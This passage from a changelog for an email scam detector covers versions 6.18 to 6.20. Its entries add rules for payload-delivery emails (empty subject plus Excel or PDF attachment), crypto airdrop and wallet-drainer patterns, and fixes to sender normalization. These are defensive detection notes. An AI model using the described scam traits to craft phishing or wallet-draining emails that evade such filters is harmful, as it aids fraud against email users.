LIMITS constants, boolean return type, rules renumbered 1-5, debugWhyFlagged() uses production pipeline, removed dead code.

## v6.20.0

Detect payload delivery scams — empty subject + attachment (Rule 5). Scam hides payload inside Excel/PDF; add scam_examples/ test phase.

## v6.19.0

Detect crypto airdrop/wallet-drainer scams via body patterns. Add crypto quantity pattern (\d+ $TICKER) and body-only airdrop/ connect-wallet check; each increments clickbaitCount → Rule 4.

## v6.18.0

Systemic RFC 2822 normalization fix. Normalize `from` once at top of signal collection; remove comma from marketing pattern (false positives on legit org names like "Bay Meadows, San Mateo").
